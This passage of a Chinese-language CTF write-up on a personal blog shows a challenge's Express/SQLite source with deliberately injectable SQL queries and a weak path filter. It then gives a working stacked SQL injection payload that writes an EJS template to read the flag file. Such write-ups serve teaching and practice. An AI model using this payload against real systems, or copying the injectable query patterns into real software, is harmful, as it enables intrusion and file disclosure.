+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">db</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">sqlite3</span>.<span style="color:#a6e22e">Database</span>(<span style="color:#e6db74">&#39;./db.sqlite&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">FLAG in /fla4444444aaaaaagg.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">urlencoded</span>({ <span style="color:#a6e22e">extended</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#e6db74">&#39;public&#39;</span>)));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">session</span>({
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">secret</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;welcometoycb2025&#39;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">resave</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">saveUninitialized</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">cookie</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">secure</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span> }
+</span></span><span style="display:flex;"><span>}));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;views&#39;</span>, <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#e6db74">&#39;views&#39;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;view engine&#39;</span>, <span style="color:#e6db74">&#39;ejs&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">checkPermission</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">path</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;/login&#39;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">path</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;/register&#39;</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/login&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">isAdmin</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">403</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;无权限访问&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">checkPermission</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readdir</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#e6db74">&#39;documents&#39;</span>), (<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">files</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;读取目录时发生错误:&#39;</span>, <span style="color:#a6e22e">err</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;目录读取失败&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">files</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">files</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;files&#39;</span>, { <span style="color:#a6e22e">files</span>, <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span> });
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;login&#39;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/register&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;register&#39;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/upload&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/login&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;upload&#39;</span>, { <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span> });
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//todoing
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/logout&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">destroy</span>(<span style="color:#a6e22e">err</span> =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;退出时发生错误:&#39;</span>, <span style="color:#a6e22e">err</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;退出失败&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/login&#39;</span>);
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">username</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sql</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`SELECT * FROM users WHERE (username = &#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;) AND password = (&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">password</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;)`</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">sql</span>,<span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">user</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">user</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">401</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;账号密码出错！！&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> { <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">id</span>, <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">isAdmin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">is_admin</span> };
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/register&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">password</span>, <span style="color:#a6e22e">confirmPassword</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">password</span> <span style="color:#f92672">!==</span> <span style="color:#a6e22e">confirmPassword</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;两次输入的密码不一致&#39;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">`INSERT INTO users (username, password) VALUES (&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">password</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)`</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;注册失败:&#39;</span>, <span style="color:#a6e22e">err</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;注册失败，用户名可能已存在&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/login&#39;</span>);
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/download&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>) <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/login&#39;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">filename</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">filename</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#39;/&#39;</span>)<span style="color:#f92672">||</span><span style="color:#a6e22e">filename</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#39;./&#39;</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;WAF&#39;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">filename</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;../../&#39;</span>)<span style="color:#f92672">||</span><span style="color:#a6e22e">filename</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;.././&#39;</span>)<span style="color:#f92672">||</span><span style="color:#a6e22e">filename</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;f&#39;</span>)<span style="color:#f92672">||</span><span style="color:#a6e22e">filename</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;//&#39;</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;WAF&#39;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">filename</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">isAbsolute</span>(<span style="color:#a6e22e">filename</span>) ) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;无效文件名&#39;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">filePath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#e6db74">&#39;documents&#39;</span>, <span style="color:#a6e22e">filename</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">existsSync</span>(<span style="color:#a6e22e">filePath</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">download</span>(<span style="color:#a6e22e">filePath</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">404</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;文件不存在&#39;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">PORT</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">PORT</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Server running on http://localhost:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">PORT</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>/register使用了 <code>db.exec</code> ，存在堆叠注入，同时观察到使用了ejs，并且/upload下不存在upload.ejs，尝试sqlite写入 upload.ejs：</p>
+<pre tabindex="0"><code>test&#39;); ATTACH DATABASE &#39;/app/views/upload.ejs&#39; AS temp; CREATE TABLE temp.pwn (data, TEXT); INSERT INTO temp.pwn (data) VALUES (&#39;&lt;%= include(&#34;/fla4444444aaaaaagg.txt&#34;) %&gt;&#39;); -- (&#39;
+</code></pre><p>访问/upload获取flag：</p>
+<p><img alt="alt" loading="lazy" src="/images/YCB2025/5.png"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
